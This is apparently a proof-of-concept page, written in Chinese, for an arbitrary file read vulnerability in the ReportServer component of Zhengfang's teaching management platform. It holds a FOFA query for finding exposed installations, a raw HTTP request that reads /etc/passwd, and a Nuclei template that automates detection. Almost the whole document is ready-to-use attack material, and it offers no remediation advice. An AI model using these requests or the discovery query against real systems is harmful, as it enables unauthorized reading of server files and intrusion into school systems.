## 正方教学管理信息服务平台ReportServer存在任意文件读取漏洞

## fofa
```
body="正方软件股份有限公司" && title="教学管理信息服务平台"
```

## poc
```
GET /WebReport/ReportServer?op=resource&resource=/etc/passwd&i18n=true HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 0

```
![b211abfd216e9904485e663877a1e747](https://github.com/wy876/POC/assets/139549762/97cb775c-c793-4384-9205-e718ea321f57)

## Nuclei脚本
```
id: zfjxgl-reportserver-anyfileread

info:
  name: zfjxgl-reportserver-anyfileread
  author: xxxx
  severity: high

http:
  - raw:
    - | 
      GET /WebReport/ReportServer?op=resource&resource=/etc/passwd&i18n=true HTTP/1.1
      Host: {{Hostname}}
      Content-Type: text/plain
      Connection: close

    matchers:
      - type: dsl
        dsl:
         - status_code==200 && contains_all(body,"root")

```
